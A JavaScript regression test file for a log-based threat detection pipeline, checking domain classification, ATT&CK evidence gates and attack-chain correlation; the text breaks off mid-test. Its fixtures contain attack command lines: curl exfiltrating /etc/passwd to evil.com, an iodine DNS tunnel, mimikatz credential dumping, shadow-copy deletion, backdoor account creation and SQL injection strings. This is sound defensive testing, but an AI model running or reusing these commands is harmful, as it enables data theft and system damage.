/**
 * ═══════════════════════════════════════════════════════════════════
 *  RAYKAN — Global Detection Pipeline Regression Test Suite v2.0
 *  Wadjet-Eye AI Platform
 *
 *  Tests all domains:
 *   • Windows Security Events (4624, 4625, 4688, 4672, 4720)
 *   • Linux / SSH logs (sshd, sudo, cron, auditd)
 *   • Firewall / Network logs (iptables, Cisco ASA, Windows FW)
 *   • Web Server logs (Apache, Nginx, IIS W3C)
 *   • Database logs (MySQL, MSSQL)
 *   • Cross-domain attack chains
 *
 *  Verified properties:
 *   1. Zero false-positive ATT&CK assignments (evidence gates enforced)
 *   2. Correct domain classification (GLC)
 *   3. Correct technique assignments when evidence IS present
 *   4. Cross-domain behavioral chains detected by BCE
 *   5. No module (AI, narrative, mapper) can override CEA decisions
 *   6. Consistent results across multiple runs (determinism)
 *
 *  backend/tests/raykan-global-pipeline-regression.test.js
 * ═══════════════════════════════════════════════════════════════════
 */

'use strict';

const GLC = require('../services/raykan/global-log-classifier');
const CEA = require('../services/raykan/central-evidence-authority');
const BCE = require('../services/raykan/behavioral-correlation-engine');

// ─────────────────────────────────────────────────────────────────────────────
//  TEST RUNNER
// ─────────────────────────────────────────────────────────────────────────────
let passed = 0;
let failed = 0;
const failures = [];

function assert(condition, testName, detail = '') {
  if (condition) {
    passed++;
    console.log(`  ✅ [PASS] ${testName}`);
  } else {
    failed++;
    const msg = `  ❌ [FAIL] ${testName}${detail ? ': ' + detail : ''}`;
    failures.push(msg);
    console.log(msg);
  }
}

function group(name) {
  console.log(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`  ${name}`);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
}

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function makeDet(tags, opts = {}) {
  return {
    ruleId   : opts.ruleId    || 'TEST-' + tags.join('-').replace(/\./g, '_'),
    title    : opts.title     || 'Test Detection',
    severity : opts.severity  || 'medium',
    confidence: opts.confidence || 70,
    tags,
    event    : opts.event || {},
    logsource: opts.logsource || {},
    ...opts,
  };
}

function makeEvt(overrides = {}) {
  return {
    eventId   : overrides.eventId   || null,
    user      : overrides.user      || null,
    computer  : overrides.computer  || 'WORKSTATION1',
    process   : overrides.process   || null,
    commandLine: overrides.commandLine || null,
    source    : overrides.source    || '',
    format    : overrides.format    || '',
    channel   : overrides.channel   || '',
    raw       : overrides.raw       || {},
    ...overrides,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 1: Global Log Classifier (GLC) — Domain Classification
// ─────────────────────────────────────────────────────────────────────────────
group('Group 1: Global Log Classifier (GLC) — Domain Classification');

// 1.1 Windows Security event
{
  const evt = GLC.classify({ eventId: '4624', raw: { EventID: '4624', Channel: 'Security' } });
  assert(evt._meta.domain === 'windows_security', '1.1 EventID 4624 → windows_security domain',
    `got: ${evt._meta.domain}`);
  assert(evt._meta.classified === true, '1.2 Event marked as classified');
  assert(evt._meta.subDomain === 'authentication', '1.3 Correct sub-domain: authentication',
    `got: ${evt._meta.subDomain}`);
}

// 1.4 Windows process event (Sysmon)
{
  const evt = GLC.classify({ eventId: '1', channel: 'microsoft-windows-sysmon/operational', source: 'sysmon' });
  assert(evt._meta.domain === 'windows_process', '1.4 Sysmon EID 1 → windows_process domain',
    `got: ${evt._meta.domain}`);
}

// 1.5 Linux SSH auth log
{
  const evt = GLC.classify({ format: 'syslog', program: 'sshd', source: '/var/log/auth.log',
    message: 'Failed password for root from 10.0.0.1 port 22222 ssh2' });
  assert(evt._meta.domain === 'linux', '1.5 sshd syslog → linux domain', `got: ${evt._meta.domain}`);
  assert(evt._meta.subDomain === 'ssh', '1.6 SSH sub-domain', `got: ${evt._meta.subDomain}`);
}

// 1.7 Apache web log
{
  const evt = GLC.classify({ source: 'apache', raw: { 'cs-method': 'GET', 'cs-uri-stem': '/index.php' } });
  assert(evt._meta.domain === 'web', '1.7 Apache access log → web domain', `got: ${evt._meta.domain}`);
  assert(evt._meta.subDomain === 'apache', '1.8 Apache sub-domain', `got: ${evt._meta.subDomain}`);
}

// 1.9 IIS W3C log
{
  const evt = GLC.classify({ raw: { 'cs-method': 'POST', 'cs-uri-stem': '/admin.php', 'sc-status': '200', 'cs-uri-query': 'id=1 UNION SELECT' } });
  assert(evt._meta.domain === 'web', '1.9 IIS W3C fields → web domain', `got: ${evt._meta.domain}`);
}

// 1.10 Firewall log
{
  const evt = GLC.classify({ source: 'iptables', raw: { action: 'BLOCK', src_ip: '1.2.3.4', dst_ip: '10.0.0.1', dst_port: '22' } });
  assert(evt._meta.domain === 'firewall', '1.10 iptables log → firewall domain', `got: ${evt._meta.domain}`);
}

// 1.11 Windows Firewall event
{
  const evt = GLC.classify({ eventId: '5156', raw: { EventID: '5156' } });
  assert(evt._meta.domain === 'firewall', '1.11 Windows FW EventID 5156 → firewall domain', `got: ${evt._meta.domain}`);
}

// 1.12 MySQL database log
{
  const evt = GLC.classify({ source: 'mysql', raw: { query: 'SELECT * FROM users', db_user: 'root' } });
  assert(evt._meta.domain === 'database', '1.12 MySQL query log → database domain', `got: ${evt._meta.domain}`);
}

// 1.13 DNS log (Sysmon EID 22)
{
  const evt = GLC.classify({ eventId: '22', channel: 'microsoft-windows-sysmon/operational', source: 'sysmon' });
  assert(evt._meta.domain === 'dns', '1.13 Sysmon EID 22 → dns domain', `got: ${evt._meta.domain}`);
}

// 1.14 Logsource gate: web rule vs. Windows auth event
{
  const rule = { logsource: { category: 'webserver' }, tags: ['attack.t1190'] };
  const winEvt = GLC.classify({ eventId: '4624', raw: { EventID: '4624' } });
  assert(!GLC.isRuleCompatible(rule, winEvt), '1.14 Webserver rule blocked against Windows auth event');
}

// 1.15 Logsource gate: linux rule vs. Windows auth event
{
  const rule = { logsource: { category: 'linux' }, tags: ['attack.t1059.004'] };
  const winEvt = GLC.classify({ eventId: '4688', raw: { EventID: '4688' } });
  assert(!GLC.isRuleCompatible(rule, winEvt), '1.15 Linux rule blocked against Windows process event');
}

// 1.16 Logsource gate: process_creation rule compatible with Windows process event
{
  const rule = { logsource: { category: 'process_creation' }, tags: ['attack.t1059.001'] };
  const winEvt = GLC.classify({ eventId: '4688', raw: { EventID: '4688', Channel: 'Security' } });
  assert(GLC.isRuleCompatible(rule, winEvt), '1.16 process_creation rule compatible with Windows process event');
}

// 1.17 Field canonicalization
{
  const evt = GLC.classify({
    raw: { TargetUserName: 'bob', IpAddress: '192.168.1.100', AuthenticationPackageName: 'NTLM', LogonType: '3' }
  });
  assert(evt.user === 'bob' || evt._canonical?.user === 'bob', '1.17 TargetUserName → canonical user');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 2: CEA — Windows Security Evidence Gates
// ─────────────────────────────────────────────────────────────────────────────
group('Group 2: CEA — Windows Security Evidence Gates');

// 2.1 T1190 blocked on Windows auth event (no web evidence)
{
  CEA.resetMetrics();
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624', LogonType: '3' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1190', ctx, events[0]);
  assert(!r.allowed, '2.1 T1190 blocked on pure Windows auth event');
}

// 2.2 T1190 allowed with web parent process
{
  const events = [makeEvt({ eventId: '4688', parentProc: 'w3wp.exe', raw: { EventID: '4688' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1190', ctx, events[0]);
  assert(r.allowed, '2.2 T1190 allowed with w3wp.exe parent process');
}

// 2.3 T1110.001 blocked on single 4625
{
  const events = [makeEvt({ eventId: '4625', raw: { EventID: '4625', TargetUserName: 'admin' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1110.001', ctx, events[0]);
  assert(!r.allowed, '2.3 T1110.001 blocked on single failed logon');
  assert(r.alternative === 'T1078', '2.4 T1110.001 → downgrades to T1078');
}

// 2.5 T1110.001 allowed with ≥3 failures
{
  const events = Array(4).fill(0).map((_, i) => makeEvt({ eventId: '4625',
    raw: { EventID: '4625', TargetUserName: 'admin' }, computer: 'DC1' }));
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1110.001', ctx, events[0]);
  assert(r.allowed, '2.5 T1110.001 allowed with ≥3 failed logons');
}

// 2.6 T1110.003 allowed with ≥3 distinct target users
{
  const users = ['alice','bob','charlie'];
  const events = users.map(u => makeEvt({ eventId: '4625', raw: { EventID: '4625', TargetUserName: u } }));
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1110.003', ctx, events[0]);
  assert(r.allowed, '2.6 T1110.003 (password spray) allowed with 3 distinct target users');
}

// 2.7 T1550.002 blocked on single-host NTLM
{
  const events = [makeEvt({ eventId: '4624', computer: 'DC1',
    raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM', IpAddress: '192.168.1.10' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1550.002', ctx, events[0]);
  assert(!r.allowed, '2.7 T1550.002 blocked on single-host NTLM logon');
  assert(r.alternative === 'T1078', '2.8 T1550.002 → downgrades to T1078');
}

// 2.9 T1550.002 allowed with cross-host NTLM
{
  const events = ['DC1','DC2'].map(host => makeEvt({ eventId: '4624', computer: host,
    raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM', IpAddress: '192.168.1.10' } }));
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1550.002', ctx, events[0]);
  assert(r.allowed, '2.9 T1550.002 allowed with cross-host NTLM (2 hosts)');
}

// 2.10 T1021.002 blocked on single-host auth event only
{
  const events = [makeEvt({ eventId: '4624', computer: 'WS1',
    raw: { EventID: '4624', LogonType: '3' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1021.002', ctx, events[0]);
  assert(!r.allowed, '2.10 T1021.002 blocked on single-host auth event without SMB evidence');
}

// 2.11 T1021.002 allowed with PsExec binary
{
  const events = [makeEvt({ eventId: '4688', process: 'psexec.exe', computer: 'DC1',
    raw: { EventID: '4688', Image: 'psexec.exe' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1021.002', ctx, events[0], {}, {});
  assert(r.allowed, '2.11 T1021.002 allowed with psexec.exe process');
}

// 2.12 T1136.001 allowed with net user /add
{
  const events = [makeEvt({ eventId: '4688', commandLine: 'net user backdoor P@ss /add', raw: { EventID: '4688' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1136.001', ctx, events[0], {}, {});
  assert(r.allowed, '2.12 T1136.001 allowed with net user /add command');
}

// 2.13 T1059.001 allowed with PowerShell
{
  const events = [makeEvt({ eventId: '4688', process: 'powershell.exe', raw: { EventID: '4688' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1059.001', ctx, events[0], {}, {});
  assert(r.allowed, '2.13 T1059.001 allowed with powershell.exe process');
}

// 2.14 Batch validation: T1190 stripped from Windows auth batch
{
  const events = Array(2).fill(0).map(() => makeEvt({ eventId: '4624', raw: { EventID: '4624' } }));
  const dets = [makeDet(['attack.t1190', 'attack.t1059.001'], { event: events[0] })];
  const validated = CEA.validateBatch(dets, events);
  const tags = validated[0]?.tags || [];
  assert(!tags.some(t => t.includes('t1190')), '2.14 T1190 stripped from detection batch (Windows auth events)');
}

// 2.15 T1003.001 allowed with Sysmon EID 10 (LSASS access)
{
  const events = [makeEvt({ eventId: '10', source: 'sysmon',
    raw: { EventID: '10', TargetImage: 'C:\\Windows\\system32\\lsass.exe' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1003.001', ctx, events[0]);
  assert(r.allowed, '2.15 T1003.001 allowed with Sysmon EID 10 LSASS access');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 3: CEA — Linux Evidence Gates
// ─────────────────────────────────────────────────────────────────────────────
group('Group 3: CEA — Linux Evidence Gates');

// 3.1 T1059.004 blocked on Windows events
{
  const events = [makeEvt({ eventId: '4688', raw: { EventID: '4688' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1059.004', ctx, events[0],
    { logsource: { category: 'process_creation', product: 'windows' } },
    { logsource: { service: 'security' } });
  assert(!r.allowed, '3.1 T1059.004 (Unix shell) blocked on Windows events');
}

// 3.2 T1059.004 allowed on Linux events
{
  const evt = GLC.classify({ format: 'syslog', program: 'bash', source: '/var/log/auth.log',
    process: 'bash', commandLine: '/bin/bash -c "whoami"' });
  const ctx = CEA.buildEvidence([evt]);
  const r = CEA.validateTechnique('T1059.004', ctx, evt);
  assert(r.allowed, '3.2 T1059.004 allowed with bash process on Linux');
}

// 3.3 T1053.003 (Cron) blocked on Windows events
{
  const events = [makeEvt({ eventId: '4698', raw: { EventID: '4698' } })]; // Windows schtask event
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1053.003', ctx, events[0],
    {}, { logsource: { service: 'security' } });
  assert(!r.allowed, '3.3 T1053.003 (Cron) blocked on Windows events');
}

// 3.4 T1053.003 allowed on Linux
{
  const evt = GLC.classify({ format: 'syslog', program: 'cron', source: '/var/log/cron',
    commandLine: 'crontab -e' });
  const ctx = CEA.buildEvidence([evt]);
  const r = CEA.validateTechnique('T1053.003', ctx, evt);
  assert(r.allowed, '3.4 T1053.003 allowed with cron process on Linux');
}

// 3.5 SSH brute-force flag set with ≥3 SSH failures
{
  const sshFailures = Array(4).fill(0).map(() => GLC.classify({
    format : 'syslog', program: 'sshd', source: '/var/log/auth.log',
    message: 'Failed password for invalid user hacker from 10.0.0.1 port 44000 ssh2',
  }));
  const ctx = CEA.buildEvidence(sshFailures);
  assert(ctx.hasFlag('multiple_ssh_failures'), '3.5 multiple_ssh_failures flag set with ≥3 SSH failures');
  assert(ctx.hasFlag('has_linux_events'), '3.6 has_linux_events flag set');
}

// 3.7 T1021.004 blocked on Windows auth events
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1021.004', ctx, events[0],
    {}, { logsource: { service: 'security' } });
  assert(!r.allowed, '3.7 T1021.004 (SSH lateral) blocked on Windows auth events');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 4: CEA — Firewall / Network Evidence Gates
// ─────────────────────────────────────────────────────────────────────────────
group('Group 4: CEA — Firewall / Network Evidence Gates');

// 4.1 T1046 requires network scan evidence
{
  const events = [makeEvt({ raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1046', ctx, events[0]);
  assert(!r.allowed, '4.1 T1046 (Network scan) blocked without scan evidence');
}

// 4.2 T1046 allowed with nmap command
{
  const events = [makeEvt({ commandLine: 'nmap -sS -p 1-65535 192.168.1.0/24', source: 'endpoint' })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1046', ctx, events[0]);
  assert(r.allowed, '4.2 T1046 allowed with nmap command-line evidence');
}

// 4.3 T1046 allowed with port_scan_detected flag (firewall logs)
{
  // 10 firewall events each probing a different port from same source
  const fwEvts = Array(10).fill(0).map((_, i) => GLC.classify({
    source: 'iptables', raw: { action: 'BLOCK', src_ip: '1.2.3.4', dst_ip: '10.0.0.1', dst_port: String(1000 + i) }
  }));
  const ctx = CEA.buildEvidence(fwEvts);
  assert(ctx.hasFlag('port_scan_detected'), '4.3 port_scan_detected flag set with diverse ports from one IP');
  assert(ctx.hasFlag('has_firewall_logs'),  '4.4 has_firewall_logs flag set');
  const r = CEA.validateTechnique('T1046', ctx, fwEvts[0]);
  assert(r.allowed, '4.5 T1046 allowed when port_scan_detected flag is set');
}

// 4.6 T1048 requires outbound transfer evidence
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1048', ctx, events[0]);
  assert(!r.allowed, '4.6 T1048 (Exfil) blocked without outbound transfer evidence');
}

// 4.7 T1048 allowed with curl/scp command
{
  const events = [makeEvt({ commandLine: 'curl -X POST https://evil.com/upload -F "file=@/etc/passwd"' })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1048', ctx, events[0]);
  assert(r.allowed, '4.7 T1048 allowed with curl exfil command');
}

// 4.8 T1572 requires tunneling tool evidence
{
  const events = [makeEvt({ commandLine: 'iodine -f -P password tunnel.evil.com' })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1572', ctx, events[0]);
  assert(r.allowed, '4.8 T1572 (Protocol tunnel) allowed with iodine command');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 5: CEA — Web Server Evidence Gates
// ─────────────────────────────────────────────────────────────────────────────
group('Group 5: CEA — Web Server Evidence Gates');

// 5.1 T1190 blocked on non-web event
{
  const events = [makeEvt({ eventId: '4625', source: 'security', raw: { EventID: '4625' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1190', ctx, events[0]);
  assert(!r.allowed, '5.1 T1190 blocked on pure Windows auth event');
}

// 5.2 T1190 allowed on Apache web log
{
  const evt = GLC.classify({ source: 'apache', raw: { 'cs-method': 'POST', 'cs-uri-stem': '/login.php',
    'sc-status': '500', 'cs-uri-query': "id=1'--" } });
  const ctx = CEA.buildEvidence([evt]);
  const r = CEA.validateTechnique('T1190', ctx, evt,
    { logsource: { category: 'webserver' } }, {});
  assert(r.allowed, '5.2 T1190 allowed on Apache web log with URL field');
}

// 5.3 SQLi pattern detected in web logs
{
  const webEvts = [GLC.classify({
    source: 'nginx',
    raw: { 'cs-method': 'GET', 'cs-uri-stem': '/search.php',
           'cs-uri-query': "q=1 UNION SELECT username,password FROM users--", 'sc-status': '200' }
  })];
  const ctx = CEA.buildEvidence(webEvts);
  assert(ctx.hasFlag('has_webserver_logs'), '5.3 has_webserver_logs flag set from Nginx event');
  assert(ctx.hasFlag('sqli_patterns_detected'), '5.4 sqli_patterns_detected flag set for UNION SELECT');
}

// 5.5 T1505.003 (Web Shell) blocked without web parent
{
  const events = [makeEvt({ eventId: '4688', process: 'cmd.exe', raw: { EventID: '4688' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1505.003', ctx, events[0]);
  assert(!r.allowed, '5.5 T1505.003 (Web Shell) blocked without web parent or web telemetry');
}

// 5.6 T1505.003 allowed with w3wp.exe parent
{
  const events = [makeEvt({ eventId: '4688', process: 'cmd.exe', parentProc: 'w3wp.exe',
    commandLine: 'cmd.exe /c whoami', raw: { EventID: '4688', ParentImage: 'w3wp.exe' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1505.003', ctx, events[0]);
  assert(r.allowed, '5.6 T1505.003 allowed with w3wp.exe parent process (IIS web shell)');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 6: CEA — Database Evidence Gates
// ─────────────────────────────────────────────────────────────────────────────
group('Group 6: CEA — Database Evidence Gates');

// 6.1 T1005 blocked on Windows auth event
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1005', ctx, events[0],
    {}, { logsource: { service: 'security' } });
  assert(!r.allowed, '6.1 T1005 (Data from local system) blocked on Windows auth event');
}

// 6.2 T1005 allowed with mysqldump command
{
  const events = [makeEvt({ commandLine: 'mysqldump -u root -p mydb > dump.sql', source: 'mysql' })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1005', ctx, events[0]);
  assert(r.allowed, '6.2 T1005 allowed with mysqldump command');
}

// 6.3 T1213 blocked on Windows auth event
{
  const events = [makeEvt({ eventId: '4624', raw: { EventID: '4624' } })];
  const ctx = CEA.buildEvidence(events);
  const r = CEA.validateTechnique('T1213', ctx, events[0],
    {}, { logsource: { service: 'security' } });
  assert(!r.allowed, '6.3 T1213 (Data from info repos) blocked on Windows auth event');
}

// 6.4 T1213 allowed with SQL query in database log
{
  const evt = GLC.classify({ source: 'mssql', raw: { query: 'SELECT * FROM customers WHERE id > 0', database: 'shop' } });
  const ctx = CEA.buildEvidence([evt]);
  const r = CEA.validateTechnique('T1213', ctx, evt);
  assert(r.allowed, '6.4 T1213 allowed with SQL query in database event');
}

// 6.5 has_database_events flag set from MSSQL events
{
  const dbEvts = [GLC.classify({ source: 'mssql', raw: { query: 'SELECT * FROM accounts' } })];
  const ctx = CEA.buildEvidence(dbEvts);
  assert(ctx.hasFlag('has_database_events'), '6.5 has_database_events flag set from MSSQL event');
}

// 6.6 has_database_exfil flag set from mysqldump
{
  const dbEvts = [GLC.classify({ source: 'mysql', commandLine: 'mysqldump -u root mydb' })];
  const ctx = CEA.buildEvidence(dbEvts);
  assert(ctx.hasFlag('has_database_exfil'), '6.6 has_database_exfil flag set from mysqldump command');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 7: Behavioral Correlation Engine (BCE) — Windows Chains
// ─────────────────────────────────────────────────────────────────────────────
group('Group 7: BCE — Windows Attack Chains');

// 7.1 Brute-force chain detected
{
  const events = [
    ...Array(4).fill(0).map(() => GLC.classify({ eventId: '4625', computer: 'DC1',
      raw: { EventID: '4625', TargetUserName: 'admin' } })),
    GLC.classify({ eventId: '4624', computer: 'DC1',
      raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const bruteChain = result.chains.find(c => c.id === 'WIN-BRUTEFORCE');
  assert(bruteChain != null, '7.1 Brute-force chain detected by BCE');
  assert(bruteChain.techniques.some(t => t.id.startsWith('T1110')), '7.2 T1110.x technique in brute-force chain');
}

// 7.3 PtH chain detected with cross-host NTLM
{
  const events = ['DC1','DC2'].map(h => GLC.classify({
    eventId: '4624', computer: h,
    raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM', IpAddress: '10.0.0.5' }
  }));
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const pthChain = result.chains.find(c => c.id === 'WIN-PTH');
  assert(pthChain != null, '7.3 Pass-the-Hash chain detected with cross-host NTLM');
  assert(pthChain.techniques.some(t => t.id === 'T1550.002'), '7.4 T1550.002 in PtH chain');
}

// 7.5 No PtH chain on single-host NTLM
{
  const events = [GLC.classify({
    eventId: '4624', computer: 'DC1',
    raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM' }
  })];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const pthChain = result.chains.find(c => c.id === 'WIN-PTH');
  assert(pthChain == null, '7.5 No PtH chain on single-host NTLM (insufficient evidence)');
}

// 7.6 Credential dump chain
{
  const events = [
    GLC.classify({ eventId: '4688', process: 'mimikatz.exe',
      commandLine: 'sekurlsa::logonpasswords', source: 'sysmon',
      raw: { EventID: '4688', Image: 'mimikatz.exe' } }),
    GLC.classify({ eventId: '4624', computer: 'DC2',
      raw: { EventID: '4624', LogonType: '3', AuthenticationPackageName: 'NTLM' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const dumpChain = result.chains.find(c => c.id === 'WIN-CRED-DUMP-LATERAL');
  assert(dumpChain != null, '7.6 Credential dump + lateral movement chain detected');
  assert(dumpChain.techniques.some(t => t.id === 'T1003.001'), '7.7 T1003.001 in cred dump chain');
}

// 7.8 Ransomware chain
{
  const events = [
    GLC.classify({ eventId: '4688', commandLine: 'vssadmin delete shadows /all /quiet',
      raw: { EventID: '4688' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const ransom = result.chains.find(c => c.id === 'WIN-RANSOMWARE');
  assert(ransom != null, '7.8 Ransomware chain detected (shadow copy deletion)');
  assert(ransom.techniques.some(t => t.id === 'T1490'), '7.9 T1490 in ransomware chain');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 8: BCE — Linux Attack Chains
// ─────────────────────────────────────────────────────────────────────────────
group('Group 8: BCE — Linux Attack Chains');

// 8.1 SSH brute-force chain
{
  const events = Array(5).fill(0).map(() => GLC.classify({
    format: 'syslog', program: 'sshd', source: '/var/log/auth.log',
    message: 'Failed password for root from 1.2.3.4 port 55000 ssh2',
  }));
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const sshChain = result.chains.find(c => c.id === 'LINUX-SSH-BRUTEFORCE');
  assert(sshChain != null, '8.1 SSH brute-force chain detected by BCE');
  assert(sshChain.techniques.some(t => t.id.startsWith('T1110')), '8.2 T1110.x in SSH brute-force chain');
}

// 8.3 No SSH brute-force chain with single failure
{
  const events = [GLC.classify({
    format: 'syslog', program: 'sshd',
    message: 'Failed password for root from 1.2.3.4 port 55000 ssh2',
  })];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const sshChain = result.chains.find(c => c.id === 'LINUX-SSH-BRUTEFORCE');
  assert(sshChain == null, '8.3 No SSH brute-force chain with single failure');
}

// 8.4 SSH to privilege escalation chain
{
  const events = [
    GLC.classify({ format: 'syslog', program: 'sshd',
      message: 'Accepted password for admin from 10.0.0.1 port 22 ssh2' }),
    GLC.classify({ format: 'syslog', program: 'sudo',
      message: 'admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash' }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const privesc = result.chains.find(c => c.id === 'LINUX-SSH-PRIVESC');
  assert(privesc != null, '8.4 SSH → sudo privilege escalation chain detected');
}

// 8.5 Cron persistence chain
{
  const events = [
    GLC.classify({ format: 'syslog', program: 'sshd',
      message: 'Accepted password for admin from 10.0.0.1 port 22 ssh2' }),
    GLC.classify({ format: 'syslog', program: 'cron',
      message: '(root) EDIT (admin)' }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const cronChain = result.chains.find(c => c.id === 'LINUX-CRON-PERSISTENCE');
  assert(cronChain != null, '8.5 Cron persistence chain detected after SSH access');
  assert(cronChain.techniques.some(t => t.id === 'T1053.003'), '8.6 T1053.003 in cron chain');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 9: BCE — Web & Firewall Chains
// ─────────────────────────────────────────────────────────────────────────────
group('Group 9: BCE — Web & Firewall Attack Chains');

// 9.1 Web SQLi chain
{
  const events = [GLC.classify({
    source: 'apache', url: '/search.php',
    raw: { 'cs-method': 'GET', 'cs-uri-stem': '/search.php',
           'cs-uri-query': "q=1 UNION SELECT table_name FROM information_schema.tables--" }
  })];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const sqliChain = result.chains.find(c => c.id === 'WEB-SQLI');
  assert(sqliChain != null, '9.1 SQL injection chain detected by BCE');
  assert(sqliChain.techniques.some(t => t.id === 'T1190'), '9.2 T1190 in SQLi chain');
}

// 9.3 Firewall port scan chain
{
  const events = Array(15).fill(0).map((_, i) => GLC.classify({
    source: 'iptables', raw: { action: 'DROP', src_ip: '5.6.7.8', dst_ip: '10.0.0.1', dst_port: String(100 + i) }
  }));
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const scanChain = result.chains.find(c => c.id === 'FW-PORT-SCAN');
  assert(scanChain != null, '9.3 Port scan chain detected by BCE');
  assert(scanChain.techniques.some(t => t.id === 'T1046'), '9.4 T1046 in port scan chain');
}

// 9.5 Database SQLi chain
{
  const events = [GLC.classify({ source: 'mssql',
    raw: { query: "SELECT * FROM users WHERE name='' UNION SELECT username,password FROM admins--" } })];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const dbSqli = result.chains.find(c => c.id === 'DB-SQLI');
  assert(dbSqli != null, '9.5 Database SQLi chain detected by BCE');
}

// ─────────────────────────────────────────────────────────────────────────────
//  GROUP 10: BCE — Cross-Domain Chains
// ─────────────────────────────────────────────────────────────────────────────
group('Group 10: BCE — Cross-Domain Attack Chains');

// 10.1 Firewall scan → Web exploit → Windows process cross-domain chain
{
  const events = [
    // Firewall: port scan from 5.6.7.8
    ...Array(10).fill(0).map((_, i) => GLC.classify({
      source: 'iptables', raw: { action: 'DROP', src_ip: '5.6.7.8', dst_ip: '10.0.0.1', dst_port: String(1000+i) }
    })),
    // Web: RCE attempt
    GLC.classify({ source: 'apache', url: '/cmd.php',
      raw: { 'cs-method': 'GET', 'cs-uri-stem': '/cmd.php', 'cs-uri-query': 'cmd=whoami' } }),
    // Windows: process spawn from w3wp
    GLC.classify({ eventId: '4688', parentProc: 'w3wp.exe', process: 'cmd.exe',
      commandLine: 'cmd.exe /c whoami', raw: { EventID: '4688', ParentImage: 'w3wp.exe' } }),
  ];
  const ceaCtx = CEA.buildEvidence(events);
  const result = BCE.correlate(events, [], ceaCtx);
  const crossChain = result.chains.find(c => c.id === 'CROSS-FW-WEB-OS');
  assert(crossChain != null, '10.1 Cross-domain FW→Web→OS chain detected');
  assert(result.stats.crossDomainChains >= 1, '10.2 Cross-domain chain count incremented');
}

// 10.2 Linux brute-force → cron persistence → firewall exfil cross-domain
{
  const events = [
    // Linux: SSH brute-force
    ...Array(5).fill(0).map(() => GLC.classify({ format: 'syslog', program: 'sshd',
      message: 'Failed password for root from 2.3.4.5 port 55000 ssh2' })),
    // Linux: SSH success
    GLC.classify({ format: 'syslog', program: 'sshd',
